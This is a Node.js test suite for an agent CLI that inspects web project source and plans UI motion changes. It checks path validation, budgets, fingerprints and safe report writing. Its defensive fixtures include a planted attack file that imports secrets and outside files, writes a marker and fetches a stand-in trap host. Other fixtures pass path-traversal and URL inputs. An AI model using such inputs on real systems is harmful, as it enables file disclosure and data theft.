import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { cp, link, lstat, mkdir, mkdtemp, readFile, readdir, readlink, realpath, rm, symlink, utimes, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { promisify } from "node:util";
import { test } from "node:test";
import { createHash } from "node:crypto";
import { booking, bookingGoal, confirm, empty, index, request } from "../../fixtures/agent/models.mjs";
import { canonical, makeIndex } from "../../src/brain/indexer.ts";
import { createMotionPlanner } from "../../src/agent/planner.ts";
import { asAgentRequest, asContext, asPlan } from "../../src/agent/validation.ts";
import { evaluate } from "./evaluate.mjs";
import { inspectProject } from "./inspect.mjs";
import { checkReport, loadRequest, saveReport } from "./report.mjs";
import { limits, motionRoot } from "./workspace.mjs";

const run = promisify(execFile);
const cli = join(motionRoot, "scripts/agent/cli.mjs");
const inspect = (input, options) => inspectProject(input, options);
const plan = createMotionPlanner(index);
const repoFixture = resolve(motionRoot, booking);
const settings = { shell: false, cwd: motionRoot };
const fileArgs = (project, file) => ["inspect", "--project", project, "--file", file, "--json"];

async function scratch(t) {
  const parent = await mkdtemp(join(await realpath(tmpdir()), "motionux-agent-"));
  t.after(() => rm(parent, { recursive: true, force: true }));
  return parent;
}
async function clone(t) {
  const parent = await scratch(t);
  const project = join(parent, "consumer");
  await cp(repoFixture, project, { recursive: true });
  return { parent, project };
}
async function put(project, path, content) {
  const file = join(project, path);
  await mkdir(dirname(file), { recursive: true });
  await writeFile(file, content);
  return file;
}
async function treeHash(root) {
  const hash = createHash("sha256");
  async function walk(path) {
    for (const item of (await readdir(join(root, path))).sort()) {
      const key = path ? path + "/" + item : item;
      const file = join(root, key);
      const stat = await lstat(file);
      hash.update(JSON.stringify([key, stat.mode, stat.size]));
      if (stat.isSymbolicLink()) hash.update(await readlink(file));
      else if (stat.isDirectory()) await walk(key);
      else if (stat.isFile()) hash.update(await readFile(file));
    }
  }
  await walk("");
  return hash.digest("hex");
}

test("independent bilingual evaluation asserts 32 authored expectations and actual source spans", async () => {
  const result = await evaluate();
  assert.ok(result.cases >= 32);
  assert.deepEqual(result.rows.filter(row => !row.passed), []);
});

test("stable JSON and content fingerprints ignore mtime but detect inspected bytes", async t => {
  const { project } = await clone(t);
  const input = request(confirm, bookingGoal, undefined, project);
  const initial = await inspect(input);
  const before = plan(input, initial.context, initial.dependencies);
  const next = await inspect(input);
  assert.equal(canonical(before), canonical(plan(input, next.context, next.dependencies)));
  const css = join(project, "src/app/palette.css");
  const now = new Date();
  await utimes(css, now, now);
  const touched = await inspect(input);
  assert.equal(initial.context.target.projectFingerprint, touched.context.target.projectFingerprint);
  const irrelevant = await put(project, "src/app/payment/page.tsx", "export default () => null;");
  assert.ok(!touched.context.files.some(item => irrelevant.endsWith("/" + item.path)));
  const { context: untouched } = await inspect(input);
  assert.equal(untouched.target.projectFingerprint, touched.context.target.projectFingerprint);
  await writeFile(css, "--changed: true;");
  const updated = await inspect(input);
  assert.notEqual(updated.context.target.projectFingerprint, untouched.target.projectFingerprint);
  assert.notEqual(plan(input, updated.context, updated.dependencies).planFingerprint, before.planFingerprint);
});

test("duplicate route groups ask for an exact file without reading either page", async t => {
  const { project } = await clone(t);
  const a = "src/app/(east)/offers/page.tsx";
  const b = "src/app/(west)/offers/page.tsx";
  for (const path of [a, b]) await put(project, path, "export default function Offers() { return <p>Offers</p>; }");
  const input = request("/offers", "Expandable card disclosure", {}, project);
  const { context } = await inspect(input);
  assert.equal(context.status, "need-more-context");
  assert.deepEqual(context.choices, [a, b]);
  assert.ok(!context.files.find(row => row.path === a || row.path === b));
  const explicit = await inspect({ project, file: a });
  assert.equal(explicit.context.target.source, a);
});

test("optional and required catch-all respect exact route precedence", async t => {
  const { project } = await clone(t);
  const a = "src/app/guides/[...topic]/page.tsx";
  const b = "src/app/docs/[[...topic]]/page.tsx";
  const c = "src/app/docs/fixed/page.tsx";
  for (const path of [a, b, c]) await put(project, path, "export default function Article() { return <main/>; }");
  for (const [route, source, canonicalRoute] of [["/guides/a/b", a, "/guides/[...topic]"], ["/docs", b, "/docs/[[...topic]]"], ["/docs/fixed", c, "/docs/fixed"]]) {
    const { context } = await inspect({ project, route });
    assert.equal(context.target.source, source);
    assert.equal(context.target.route, canonicalRoute);
  }
});

test("traversal, URL, absolute screen path, private roots and mixed flags are rejected", async t => {
  const { parent, project } = await clone(t);
  const linkRoot = join(parent, "alias");
  await symlink(project, linkRoot);
  for (const input of [
    { project: "..", route: "/" }, { project: "file://" + project, route: "/" }, { project: "https://example.test", route: "/" },
    { project: "~", route: "/" }, { project: linkRoot, route: "/" }, { project: ".motionux-v9", route: "/" },
    { project, file: join(project, "package.json") }, { project, route: "/../etc" }, { project, route: "/%2e%2e/path" },
    { project, route: "/", file: "src/app/checkout/page.tsx" }, { project, file: "../out.tsx" },
  ]) await assert.rejects(inspect(input), /explicit|workspace|canonical|route|file/);
  for (const path of ["https://trap.example.test/request.json", resolve("fixtures/agent/requests/physical-mobile.json"), "fixtures/agent/requests/../request.json"]) {
    await assert.rejects(loadRequest(path), /MotionUX-relative/);
  }
  const symlinked = join(motionRoot, "fixtures/agent/requests", "temporary-request-" + process.pid + ".json");
  await symlink(join(project, "package.json"), symlinked);
  t.after(() => rm(symlinked, { force: true }));
  await assert.rejects(loadRequest("fixtures/agent/requests/" + symlinked.split("/").at(-1)), /MotionUX-relative|non-symlink/);
});

test("malicious imports and guidance leave a cloned target and neighboring trap byte-identical", async t => {
  const { parent, project } = await clone(t);
  const trap = await put(parent, "outside-trap.ts", 'export const SENSITIVE_ADJACENT_MARKER = "private";');
  const marker = join(project, "executed.txt");
  await put(project, ".env.local", "UNRELATED_ENV_TRAP=private");
  await put(project, "package-lock.json", '{"fixture":true}');
  await put(project, ".git/config", "[fixture]");
  await put(project, "src/secret-token.ts", "const SECRET_PATH_VALUE = 'private';");
  await put(project, "node_modules/pretend/index.ts", "const MODULE_STORE_VALUE = 'private';");
  await symlink(trap, join(project, "src/link.ts"));
  await symlink(parent, join(project, "src/linked-dir"));
  await link(trap, join(project, "src/hard.ts"));
  await put(project, "src/attack.tsx", `
    import "../..//outside-trap.ts";
    import "./link";
    import "./linked-dir/outside-trap";
    import "./hard";
    import "./secret-token";
    import "../.env.local";
    import "../node_modules/pretend";
    import "https://trap.example.test/script";
    import { writeFileSync } from "node:fs";
    writeFileSync(${JSON.stringify(marker)}, "ran target code");
    fetch("https://trap.example.test/network");
    export default function Attack() { return <button>INJECTED_INSTRUCTIONS_PLACEHOLDER</button>; }
  `);
  const [before, outside] = await Promise.all([treeHash(project), readFile(trap)]);
  const { stdout } = await run(process.execPath, ["--permission", "--allow-fs-read=*", cli, ...fileArgs(project, "src/attack.tsx")], settings);
  const context = JSON.parse(stdout);
  assert.equal(context.status, "partial-inspection");
  assert.ok(context.target.coverage.issues.some(item => item.reason === "symlink"));
  assert.ok(context.target.coverage.issues.some(item => item.reason === "non-regular-file"));
  assert.ok(context.target.coverage.issues.some(item => item.reason === "blocked-or-unresolved-import"));
  assert.deepEqual(context.files.map(item => item.path).filter(path => /outside|link\.ts|hard\.ts|secret|\.env|node_modules/.test(path)), []);
  for (const secret of ["SENSITIVE_ADJACENT_MARKER", "UNRELATED_ENV_TRAP", "SECRET_PATH_VALUE", "MODULE_STORE_VALUE",
    "trap.example.test", "INJECTED_INSTRUCTIONS_PLACEHOLDER", project]) assert.ok(!stdout.includes(secret));
  assert.equal(await treeHash(project), before);
  assert.deepEqual(await readFile(trap), outside);
  await assert.rejects(lstat(marker), { code: "ENOENT" });
});

test("oversized and malformed files yield partial inspection, and never produce candidates", async t => {
  const { project } = await clone(t);
  const big = "x".repeat(limits.fileBytes + 1);
  await put(project, "src/large.tsx", big);
  await put(project, "src/malformed.tsx", "export default () => <button><p>broken;</button>");
  for (const [file, expected] of [["src/large.tsx", "file-size"], ["src/malformed.tsx", "malformed-source"]]) {
    const input = { schemaVersion: 1, project, file, goal: "Expandable card disclosure" };
    const { context, dependencies } = await inspect(input);
    assert.equal(context.status, "partial-inspection");
    assert.ok(context.target.coverage.issues.some(issue => issue.reason === expected));
    assert.deepEqual(plan(input, context, dependencies).recommendations, []);
  }
});

test("cycles deduplicate and graphs cannot read beyond a bounded depth", async t => {
  const parent = await scratch(t);
  const project = join(parent, "consumer");
  await put(project, "page.tsx", 'import "./page"; import "./level-1"; export default function Page() { return <p/>; }');
  for (let i = 1; i <= 12; i++) await put(project, "level-" + i + ".tsx", 'import "./level-' + (i + 1) + '"; import "./page"; export default () => null;');
  const { context } = await inspect({ project, file: "page.tsx" });
  assert.equal(context.status, "partial-inspection");
  assert.equal(context.target.coverage.maxDepth, limits.depth);
  assert.equal(context.files.length, 5);
  assert.equal(context.target.coverage.importsTraversed, 4);
  assert.ok(!context.files.find(file => file.path === "level-5.tsx"));
  assert.ok(context.target.coverage.issues.some(issue => issue.reason === "import-depth"));
});

test("file, byte, directory and elapsed budgets mark incomplete coverage", async t => {
  const { project } = await clone(t);
  const input = request(confirm, bookingGoal, undefined, project);
  for (const [name, value, reason] of [["files", 2, "file-count-budget"], ["bytes", 600, "byte-budget"],
    ["entries", 2, "directory-entry-budget"], ["ms", -1, "time-budget"]]) {
    const { context } = await inspect(input, { bounds: { ...limits, [name]: value } });
    assert.equal(context.status, "partial-inspection");
    assert.ok(context.target.coverage.issues.some(issue => issue.reason === reason));
  }
});

test("success, errors and mid-inspection cancellation preserve the full target directory", async t => {
  const { project } = await clone(t);
  await put(project, ".env.local", "MOCK=yes");
  await put(project, ".git/config", "[fictional]");
  await put(project, "pnpm-lock.yaml", "lockfileVersion: '9.0'");
  await put(project, "src/malformed.tsx", "export default () => <main>");
  const before = await treeHash(project);
  await inspect(request(confirm, bookingGoal, undefined, project));
  await assert.rejects(inspect({ project, file: "../not-allowed.tsx" }), /relative/);
  await inspect({ project, file: "src/malformed.tsx" });
  const abort = new AbortController();
  const pending = inspect({ project, route: confirm }, { signal: abort.signal });
  setImmediate(() => abort.abort());
  await assert.rejects(pending, { code: "cancelled" });
  assert.equal(await treeHash(project), before);
});

test("inspecting checked-in fixture never writes or executes source and process inputs stay private", async () => {
  const before = await treeHash(repoFixture);
  const { stdout } = await run(process.execPath, ["--permission", "--allow-fs-read=*", cli, "inspect", "--project", booking, "--route", confirm, "--json"], settings);
  const context = asContext(JSON.parse(stdout));
  assert.equal(context.status, "inspected");
  assert.ok(!stdout.includes(motionRoot) && !stdout.includes("trap.example.test"));
  assert.equal(await treeHash(repoFixture), before);
});

test("request/context/plan contracts reject extra properties, forged citations and altered pins", async () => {
  assert.throws(() => asAgentRequest({ ...request(), apply: true }), /Invalid Agent request/);
  assert.throws(() => asAgentRequest(request(confirm, bookingGoal, { mode: "write" })), /Invalid Agent request/);
  assert.throws(() => asAgentRequest(request(confirm, bookingGoal, { maxRecommendations: 6 })), /Invalid Agent request/);
  const inspected = await inspect(request());
  const data = plan(request(), inspected.context, inspected.dependencies);
  const forged = structuredClone(data);
  forged.recommendations[0].sourcePin.sha256 = "a".repeat(64);
  assert.throws(() => asPlan(forged), /does not match/);
  const ctx = structuredClone(inspected.context);
  ctx.evidence[0].endLine++;
  assert.throws(() => asContext(ctx), /does not match/);
});

test("source pin and evidence revisions invalidate the plan and stale catalogs withhold matches", async () => {
  const input = request();
  const { context, dependencies } = await inspect(input);
  const before = plan(input, context, dependencies);
  const records = structuredClone(index.records);
  records.find(row => row.id === before.recommendations[0].sourceId).semantic.notes = {
    value: "Refined this test-only reviewed claim", status: "curated", confidence: "medium",
    evidence: [records.find(row => row.id === before.recommendations[0].sourceId).identity],
  };
  records.find(row => row.id === before.recommendations[0].sourceId).fingerprint = "1".repeat(64);
  const revision = makeIndex(records, index.configFingerprint, "synthetic");
  const changed = createMotionPlanner(revision)(input, context, dependencies);
  assert.notEqual(changed.planFingerprint, before.planFingerprint);
  assert.notEqual(changed.brain.indexFingerprint, before.brain.indexFingerprint);
  for (const status of [{ staleIds: [before.recommendations[0].sourceId] }, { invalidIndex: true }, { unindexed: 1, indexPresent: true }]) {
    const value = createMotionPlanner(index, status)(input, context, dependencies);
    assert.equal(value.decision, "stale-index");
    assert.deepEqual(value.recommendations, []);
  }
  const missing = createMotionPlanner(empty)(input, context, dependencies);
  assert.equal(missing.decision, "not-prepared");
  assert.equal(missing.context.target.source, context.target.source);
});

test("server module prop trust fails for shadowing, negative JSX branch and mutation", async t => {
  const { project } = await clone(t);
  const route = "src/app/(stay)/bookings/confirmation/page.tsx";
  const view = "src/ui/booking-receipt.tsx";
  const originalRoute = await readFile(join(project, route), "utf8");
  const originalView = await readFile(join(project, view), "utf8");
  const input = request(confirm, bookingGoal, { state: "success" }, project);
  const cases = [
    [originalRoute.replace("  return <BookingReceipt", '  booking.status = "confirmed";\n  return <BookingReceipt'), originalView],
    [originalRoute.replace("  return <BookingReceipt booking={booking} />;", "  return <BookingReceipt booking={booking} {...{booking: {status: 'confirmed'}}} />;"), originalView],
    [originalRoute, originalView.replace("  const heading = ", '  booking.status = "confirmed";\n  const heading = ')],
    [originalRoute, originalView.replace('booking.status === "confirmed" && <p role="status">Your room is confirmed.</p>', 'booking.status === "confirmed" ? null : <p role="status">Unconfirmed</p>')],
    [originalRoute.replace('  const booking = await', '  const readBooking = async () => ({status: "confirmed"});\n  const booking = await'), originalView],
  ];
  for (const [page, receipt] of cases) {
    await put(project, route, page);
    await put(project, view, receipt);
    const { context, dependencies } = await inspect(input);
    assert.equal(context.stateOwnership.find(row => row.phase === "success").owner, "unknown");
    assert.equal(plan(input, context, dependencies).decision, "no-motion");
  }
});

test("private reports use owner-only permissions, validate fingerprints and reject unsafe destinations", async t => {
  const { project } = await clone(t);
  const input = request(confirm, bookingGoal, undefined, project);
  const { context, dependencies, root } = await inspect(input);
  const result = plan(input, context, dependencies);
  const path = ".motionux-v9/agent/reports/acceptance-" + process.pid + ".json";
  const absolute = resolve(motionRoot, path);
  t.after(() => rm(absolute, { force: true }));
  await saveReport(path, result, root);
  assert.equal((await lstat(absolute)).mode & 0o777, 0o600);
  const prior = await readFile(absolute);
  assert.equal((await checkReport(path, result, root)).status, "current");
  await put(project, "src/app/palette.css", ":root { --fictional-new: 0; }");
  const edited = await inspect(input);
  assert.equal((await checkReport(path, plan(input, edited.context, edited.dependencies), root)).projectChanged, true);
  assert.deepEqual(await readFile(absolute), prior);
  for (const bad of ["docs/report.json", ".motionux-v9/agent/reports/../../outside.json", "/tmp/report.json"]) {
    await assert.rejects(saveReport(bad, result, root), /reports/);
  }
  await assert.rejects(saveReport(path, result, motionRoot), /within the selected target/);
  const cancelled = new AbortController();
  cancelled.abort();
  await assert.rejects(saveReport(path, result, root, cancelled.signal), { code: "cancelled" });
  assert.deepEqual(await readFile(absolute), prior);
  await rm(absolute);
  const trap = await put(project, "outside-report.txt", "safe");
  await symlink(trap, absolute);
  await assert.rejects(saveReport(path, result, root), /destination/);
  await assert.rejects(checkReport(path, result, root), /unsafe/);
  assert.equal(await readFile(trap, "utf8"), "safe");
});

test("single-object CLI JSON, sanitized usage errors and explicit no-route status", async () => {
  const success = await run(process.execPath, [cli, "inspect", "--project", booking, "--json"], settings);
  assert.equal(JSON.parse(success.stdout).status, "need-more-context");
  assert.equal(success.stderr, "");
  try {
    await run(process.execPath, [cli, "inspect", "--ghp_abcdefghijk", "--json"], settings);
    assert.fail("unknown flags must fail");
  } catch (error) {
    assert.equal(error.code, 1);
    assert.equal(JSON.parse(error.stdout).status, "invalid-flags");
    assert.ok(!error.stdout.includes("ghp_"));
  }
});

test("standalone CLI retains context with no vault and refuses a malformed local index", async t => {
  const parent = await scratch(t);
  const copy = join(parent, "motionux");
  await mkdir(copy);
  for (const name of ["package.json", "src", "scripts", "schemas", "metadata", "fixtures"]) {
    await cp(join(motionRoot, name), join(copy, name), { recursive: true });
  }
  await symlink(join(motionRoot, "node_modules"), join(copy, "node_modules"), "dir");
  const args = ["--permission", "--allow-fs-read=*", join(copy, "scripts/agent/cli.mjs"), "plan",
    "--project", booking, "--route", confirm, "--goal", bookingGoal, "--json"];
  const output = JSON.parse((await run(process.execPath, args, { ...settings, cwd: copy })).stdout);
  assert.equal(output.decision, "not-prepared");
  assert.equal(output.context.status, "inspected");
  assert.deepEqual(output.recommendations, []);
  const bad = await put(copy, ".motionux-v9/brain/index.v1.json", '{"broken":true}');
  const after = JSON.parse((await run(process.execPath, args, { ...settings, cwd: copy })).stdout);
  assert.equal(after.decision, "stale-index");
  assert.equal(after.context.status, "inspected");
  assert.deepEqual(after.recommendations, []);
  assert.equal(await readFile(bad, "utf8"), '{"broken":true}');
});
